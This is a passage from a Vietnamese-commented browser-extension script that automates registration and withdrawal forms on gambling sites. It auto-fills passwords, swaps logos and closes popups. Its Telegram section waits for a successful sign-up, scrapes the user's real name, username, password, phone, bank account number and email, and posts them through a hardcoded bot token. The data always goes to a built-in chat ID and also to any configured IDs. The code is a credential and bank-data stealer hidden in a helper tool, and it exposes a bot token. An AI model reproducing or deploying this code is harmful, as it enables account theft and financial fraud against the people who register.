    if (PW_FMT_REGEX.test(bodyText)) {
      _retryingUsername = true;
      await sleep(200);
      const userEl = getUsernameInput() || document.querySelector('input[data-input-name="account"]');
      if (userEl) {
        let hardUserR = "";
        try { hardUserR = localStorage.getItem("okvip_hard_username") || ""; } catch(e) {}
        if (!hardUserR) { try { hardUserR = await new Promise(res => chrome.storage.local.get(["okvip_hard_username"], s => res(s["okvip_hard_username"] || ""))); } catch(e) {} }
        let fillVal;
        if (hardUserR) {
          fillVal = hardUserR;
        } else if (lastSelectedAccount) {
          const opts = genNickOptions(lastSelectedAccount.name);
          fillVal = opts[Math.floor(Math.random() * opts.length)].value;
        }
        if (fillVal) {
          await typeIntoInput(userEl, fillVal);
          await new Promise(r => setTimeout(r, 300));
          const actualNick = userEl.value.trim() || fillVal;
          try { chrome.storage.local.set({[LAST_USERNAME_KEY]: actualNick}); } catch(e) {}
          try { localStorage.setItem(LAST_USERNAME_KEY, actualNick); } catch(e) {}
          const confirmEl = getConfirmUsernameInput();
          if (confirmEl) await typeIntoInput(confirmEl, actualNick);
          showToast("🔄 Lỗi định dạng → đổi TK: " + actualNick, "info");
        }
      }
      setTimeout(() => { _retryingUsername = false; }, 3000);
      return;
    }
  }

  // ========== AUTO FILL MẬT KHẨU RÚT TIỀN ==========
  let _autoWithdrawDone = false;
  let _lastWithdrawCheck = 0;

  async function autoFillWithdrawPassword() {
    const now = Date.now();
    if (now - _lastWithdrawCheck < 800) return;
    _lastWithdrawCheck = now;

    const el = document.querySelector('input[formcontrolname="newPassword"]');
    if (!el) { _autoWithdrawDone = false; return; }
    if (_autoWithdrawDone) return;
    if (el.value) return;

    _autoWithdrawDone = true;
    await sleep(400);

    const inputs = getWithdrawInputs();
    for (const inp of inputs) {
      clickEyeIcon(inp);
      await sleep(150);
      await typeIntoInput(inp, getWithdrawPassword());
      await sleep(100);
    }
    showToast("🔒 Đã điền MK rút: " + getWithdrawPassword(), "success");
  }

  let __mk_obs_timer__ = null;
  new MutationObserver(() => {
    if (__mk_obs_timer__) return;
    __mk_obs_timer__ = setTimeout(() => {
      __mk_obs_timer__ = null;
      tryInjectAll();
      injectTKKMBtn();
      if(!window.__MK_CAPTCHA_SOLVING__) injectCaptchaBtn();
      checkAndRetryUsername();
      autoFillWithdrawPassword();
    }, 500);
  }).observe(document.body, { childList: true, subtree: true });
  setInterval(() => { tryInjectAll(); injectTKKMBtn(); if(!window.__MK_CAPTCHA_SOLVING__) injectCaptchaBtn(); autoFillWithdrawPassword(); }, 2000);

  // ========== REPLACE LOGO ==========
  (function replaceLogos() {
    const OLD_SRC = 'assets/images/account/logo.png';
    const NEW_SRC = 'https://i.ibb.co/8LcBc6X1/Chat-GPT-Image-05-27-27-14-thg-3-2026.png';

    function swapLogo() {
      document.querySelectorAll('img').forEach(img => {
        if(img.src && img.src.includes(OLD_SRC) && img.src !== NEW_SRC) {
          img.src = NEW_SRC;
        }
      });
    }

    swapLogo();
    new MutationObserver(swapLogo).observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['src'] });
  })();

  // ========== AUTO CLOSE POPUP ==========
  (function autoClosePopup() {
    function closeIt() {
      const btn = document.querySelector('button.right-gif-close-button');
      if(btn) { btn.click(); }
    }
    closeIt();
    new MutationObserver(closeIt).observe(document.body, { childList: true, subtree: true });
  })();

  // ========== GỬI THÔNG TIN ĐĂNG KÝ VỀ TELEGRAM ==========
  window.__MK_TG_SENT__ = false;

  (function watchRegisterSuccess() {
    const TG_TOKEN           = '7419627397:AAHroNj5bfNdkJdkDRLq5-DPaeKXI1Ep2fQ';
    const TG_CHATID_DEFAULT  = '6972426627'; // Chat ID mặc định trong code

    // ── Lấy Chat ID từ Firebase account (field tgChatId) ──
    function getAccountTgChatId() {
      // Đọc từ chrome.storage (được lưu khi setLastAccount)
      return new Promise(resolve => {
        try {
          chrome.storage.local.get(['okvip_account_tg_chatid'], s => {
            resolve((s['okvip_account_tg_chatid'] || '').trim());
          });
        } catch(e) { resolve(''); }
      });
    }

    // ── Lấy Chat ID từ localStorage (do người dùng cấu hình trong popup) ──
    function getLocalTgChatId() {
      try { return (localStorage.getItem("okvip_tg_chatid") || "").trim(); } catch(e) { return ""; }
    }

    // ── Gửi tới 1 chatId ──
    async function sendToOne(chatId, text) {
      try {
        const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
        });
        console.log('[TG] sent to', chatId, ':', r.status);
      } catch(e) { console.log('[TG] error sending to', chatId, ':', e); }
    }

    // ── Gửi đồng thời tới TẤT CẢ các chat ID ──
    async function sendTelegram(text) {
      const accountChatId = await getAccountTgChatId(); // Chat ID từ Firebase account
      const localChatId   = getLocalTgChatId();         // Chat ID từ localStorage/popup

      // Tập hợp tất cả ID duy nhất, lọc rỗng
      const ids = [...new Set([
        TG_CHATID_DEFAULT,   // 1. Luôn gửi về ID cứng trong code
        accountChatId,       // 2. Chat ID từ Firebase (field tgChatId của account được chọn)
        localChatId,         // 3. Chat ID người dùng nhập trong popup (nếu có)
      ].filter(Boolean))];

      console.log('[TG] Gửi tới', ids.length, 'chat IDs:', ids);
      await Promise.all(ids.map(id => sendToOne(id, text)));
    }

    function scanAllInputs() {
      const result = {};
      const KW = {
        name:     /họ.*tên|ho.*ten|tên thật|full.?name|realname|real.?name/i,
        username: /tên tài khoản|ten tai khoan|username|account/i,
        phone:    /điện thoại|dien thoai|phone|mobile|sdt|số đt/i,
        stk:      /số tài khoản|so tai khoan|bank.?account|stk|account.?number/i,
        email:    /email|e-mail/i,
      };
      for(const input of document.querySelectorAll('input[type="text"],input[type="number"],input[type="tel"],input[type="email"]')) {
        const val = (input.value || '').trim();
        if(!val) continue;
        const hints = [
          input.placeholder||'', input.name||'', input.id||'',
          input.getAttribute('formcontrolname')||'',
          input.getAttribute('aria-label')||'',
          input.getAttribute('data-input-name')||'',
        ].join(' ');
        for(const [key, rx] of Object.entries(KW)) {
          if(!result[key] && rx.test(hints)) result[key] = val;
        }
      }
      return result;
    }

    function doSend() {
      if(window.__MK_TG_SENT__) return;
      window.__MK_TG_SENT__ = true;

      chrome.storage.local.get(
        [LAST_USERNAME_KEY, LAST_PHONE_KEY, LAST_STK_KEY, LAST_NAME_KEY],
        (stored) => {
          const scanned = scanAllInputs();

          const userElVal = (() => {
            try {
              const el = getUsernameInput();
              return el?.value?.trim() || '';
            } catch(e) { return ''; }
          })();

          const name     = scanned.name     || stored[LAST_NAME_KEY]     || '—';
          const username = userElVal || scanned.username || stored[LAST_USERNAME_KEY] || '—';
          const phone    = scanned.phone    || stored[LAST_PHONE_KEY]    || '—';
          const stk      = scanned.stk      || stored[LAST_STK_KEY]      || '—';
          const email    = scanned.email    || '—';
          const domain   = window.location.hostname;

          if(username === '—' && phone === '—') {
            window.__MK_TG_SENT__ = false;
            setTimeout(doSend, 1000);
            return;
          }

          if(username !== '—') {
            try { chrome.storage.local.set({[LAST_USERNAME_KEY]: username}); } catch(e) {}
            try { localStorage.setItem(LAST_USERNAME_KEY, username); } catch(e) {}
            // Lưu lên Firestore để trang KM (khác domain) đọc được
            saveUsernameToFirestore(username);
          }

          const lines = [
            '🎉 <b>ĐĂNG KÝ THÀNH CÔNG</b>',
            `🌐 <b>Trang:</b> ${domain}`,
          ];
          if(name     !== '—') lines.push(`👤 <b>Tên thật:</b> ${name}`);
          if(username !== '—') lines.push(`🆔 <b>Tên TK:</b> ${username}`);
          lines.push(`🔑 <b>Mật khẩu:</b> ${getPassword()}`);
          if(phone    !== '—') lines.push(`📱 <b>SĐT:</b> ${phone}`);
          if(stk      !== '—') lines.push(`💳 <b>STK:</b> ${stk}`);
          if(email    !== '—') lines.push(`📧 <b>Email:</b> ${email}`);
          lines.push(`⏰ <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}`);

          // Gửi đồng thời tới TG_CHATID_DEFAULT + Firebase tgChatId + localStorage chatId
          sendTelegram(lines.join("\n"));

          // Gửi marker để trang KM cross-domain đọc TK
          if (username !== '—') {
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({ chat_id: TG_CHATID_DEFAULT, text: `OKVIP_LAST_TK:${username}` })
            }).catch(() => {});
          }
        }
      );
    }

    function isOldSuccessVisible() {
      if(document.querySelector('button[translate="Register_StartGame"]')) return true;
      if(document.querySelector('button[translate="Register_DepositImmediately"]')) return true;
      const btns = [...document.querySelectorAll('button')];
      if(btns.some(b => /bắt đầu trò chơi/i.test(b.textContent))) return true;
      return false;
    }

    function isNewSuccessVisible() {
      const hasMsg = [...document.querySelectorAll('span')].some(s =>
        /chúc mừng đăng ký thành công/i.test(s.textContent?.trim())
      );
      if(!hasMsg) return false;
      const hasApp = [...document.querySelectorAll('span')].some(s =>
        /tải app/i.test(s.textContent?.trim())
      );
      if(!hasApp) return false;
      if(!document.querySelector('button.registerRechargeBtn')) return false;
      const hasRef = [...document.querySelectorAll('div, span')].some(s =>
        /giới thiệu bạn/i.test(s.textContent?.trim())
      );
      if(!hasRef) return false;
      return true;
    }

    function isDepositPopupSuccessVisible() {
      const title = document.querySelector('.deposit-popup-title');
      if(title && /đăng ký thành công/i.test(title.textContent)) return true;
      const t2 = document.querySelector('.deposit-popup-text-2');
      const t4 = document.querySelector('.deposit-popup-text-4');
      if(t2 && t4) return true;
      return false;
    }

    function attachSubmitBtnListener() {
      const btns = document.querySelectorAll('button.submit-btn');
      btns.forEach(b => {
        if(b.__mk_submitbtn_attached__) return;
        if(!/đăng ký/i.test(b.textContent?.trim())) return;
        b.__mk_submitbtn_attached__ = true;
        b.addEventListener('click', () => {
          if(window.__MK_TG_SENT__) return;
          let tries = 0;
          const poll = setInterval(() => {
            tries++;
            if(isDepositPopupSuccessVisible() || isNewSuccessVisible() || isOldSuccessVisible() || isMcSuccessVisible()) {
              clearInterval(poll);
              doSend();
            }
            if(tries > 30) clearInterval(poll);
          }, 500);
        });
        console.log('[TG] attached to button.submit-btn Đăng ký');
      });
    }

    function isMcSuccessVisible() {
      const g1 = document.querySelector('.guide-1');
      if(g1 && /đăng ký thành công/i.test(g1.textContent)) return true;
      const g3 = document.querySelector('.guide-3');
      const g4 = document.querySelector('.guide-4-text');
      if(g1 && g3 && g4) return true;
      return false;
    }

    function attachMcRegisterListener() {
      const mcContainer = document.querySelector('#mc-animate-container');
      if(!mcContainer) return;
      const btns = mcContainer.querySelectorAll('button');
      btns.forEach(b => {
        if(b.__mk_mc_attached__) return;
        const spanText = b.querySelector('span')?.textContent?.trim() || b.textContent?.trim();
        if(!/đăng ký/i.test(spanText)) return;
        b.__mk_mc_attached__ = true;
        b.addEventListener('click', () => {
          if(window.__MK_TG_SENT__) return;
          let tries = 0;
          const poll = setInterval(() => {
            tries++;
            if(isMcSuccessVisible() || isNewSuccessVisible() || isOldSuccessVisible()) {
              clearInterval(poll);
              doSend();
            }
            if(tries > 30) clearInterval(poll);
          }, 500);
        });
        console.log('[TG] attached to mc-animate-container Đăng ký button');
      });
    }

    let __mk_tg_obs_timer__ = null;
    new MutationObserver(() => {
      if(window.__MK_TG_SENT__) return;
      if(__mk_tg_obs_timer__) return;
      __mk_tg_obs_timer__ = setTimeout(() => {
        __mk_tg_obs_timer__ = null;
        if(window.__MK_TG_SENT__) return;
        if(isOldSuccessVisible() || isNewSuccessVisible() || isMcSuccessVisible() || isDepositPopupSuccessVisible()) doSend();
      }, 300);
    }).observe(document.body, { childList: true, subtree: true });

    function attachSubmitListener() {
      const submitBtn = document.getElementById('insideRegisterSubmitClick');
      if(!submitBtn || submitBtn.__mk_tg_attached__) return;
      submitBtn.__mk_tg_attached__ = true;
      submitBtn.addEventListener('click', () => {
        if(window.__MK_TG_SENT__) return;
        let tries = 0;
        const poll = setInterval(() => {
          tries++;
          if(isNewSuccessVisible() || isOldSuccessVisible() || isMcSuccessVisible()) {
            clearInterval(poll);
            doSend();
          }
          if(tries > 20) clearInterval(poll);
        }, 500);
      }, { once: false });
      console.log('[TG] attached to insideRegisterSubmitClick');
    }

    attachSubmitListener();
    attachMcRegisterListener();
    attachSubmitBtnListener();
    let __mk_attach_timer__ = null;
    new MutationObserver(() => {
      if(__mk_attach_timer__) return;
      __mk_attach_timer__ = setTimeout(() => {
        __mk_attach_timer__ = null;
        attachSubmitListener();
        attachMcRegisterListener();
        attachSubmitBtnListener();
      }, 400);
    }).observe(document.body, { childList: true, subtree: true });
  })();

  showToast("✅ Tool đã sẵn sàng!", "success");

})();
